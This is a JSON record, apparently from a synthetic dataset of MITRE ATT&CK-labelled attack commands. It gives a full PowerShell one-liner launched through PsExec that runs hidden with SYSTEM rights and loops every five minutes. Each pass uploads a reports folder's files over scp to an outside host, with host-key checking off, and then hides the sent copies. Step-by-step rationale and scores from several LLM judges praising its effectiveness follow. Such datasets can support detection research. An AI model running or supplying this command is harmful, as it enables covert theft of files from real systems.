@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$env:Path += ';C:\\Windows\\System32\\OpenSSH'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true) { Get-ChildItem 'C:\\Users\\Public\\Reports' -File -Recurse | ForEach-Object { & scp -q -o StrictHostKeyChecking=no $_.FullName user@203.0.113.10:/var/drop/ > $null 2>&1; if ($LASTEXITCODE -eq 0) { Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep -Seconds 300 }\"",
+  "explanation": "Periodically scans a reports directory and automatically exfiltrates files to an SFTP server using scp, then moves exfiltrated files to a quarantine folder to avoid duplication.",
+  "rationale_steps": [
+    "Run as hidden SYSTEM using PSExec for elevated, quiet execution.",
+    "Ensure OpenSSH in PATH for scp availability.",
+    "Loop through target directory and upload files with scp using quiet mode.",
+    "Move successfully uploaded files to C:\\ProgramData\\.sent to prevent re-exfiltration.",
+    "Sleep between cycles to minimize resource usage and network noise."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-2e5e355b",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PsExec invocation with valid flags and a PowerShell command that has balanced quotes/braces, proper separators, and correct redirections.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements automated periodic exfiltration via scp and quarantines sent files, but is likely to fail without admin rights for -s and without non-interactive SSH authentication configured.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:02:08.206548Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct PowerShell syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using a persistent loop that scans for files, transfers them via SCP to an external server, tracks successful transfers, and runs with elevated privileges via PsExec.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:55:39.809262Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct command separators, valid flags for both psexec and powershell, and proper PowerShell syntax for external command execution and scripting constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of periodic automated exfiltration using scp, correctly handles stealth and non-interactivity, and implements a robust mechanism to avoid re-exfiltration, fully aligning with MITRE ATT&CK T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:55:51.547247Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
